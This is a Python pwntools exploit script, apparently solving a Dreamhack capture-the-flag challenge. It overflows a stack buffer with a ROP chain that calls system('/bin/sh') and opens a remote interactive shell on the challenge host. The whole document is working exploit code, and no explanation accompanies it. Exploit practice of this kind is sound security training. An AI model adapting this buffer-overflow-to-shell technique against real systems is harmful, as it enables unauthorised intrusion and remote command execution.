from pwn import*
context.log_level = 'debug'
e =  ELF("../release/chall")
binsh = list(e.search(b"/bin/sh\x00"))[0]
prdi = 0x4023c3

def main():
    global e
    payload = b""
    payload += b"A" * (0x120+8)
    payload += p64(prdi)
    payload += p64(binsh)
    payload += p64(prdi+1)
    payload += p64(e.plt['system'])

    try:
        sla('[>] ', '1')
        sa(': ', 'Eve')
        if '9' not in r.recvline().decode():
            return

        sa('[Eve] ', 'hi')
        r.recvuntil(b'[+] Day 3 - Morning', timeout=3)
        sa('[Eve] ', 'hi')
        sa('[>]', 'Eve')
        sa('[>]', payload)

        r.interactive()
        
    except KeyboardInterrupt as e:
        exit()
        
    except Exception:
        r.close()

while True:
    #r = process("../release/chall")
    r = remote("host3.dreamhack.games", 14817)
    sa = r.sendafter
    sla = r.sendlineafter
    main()
    r.close()
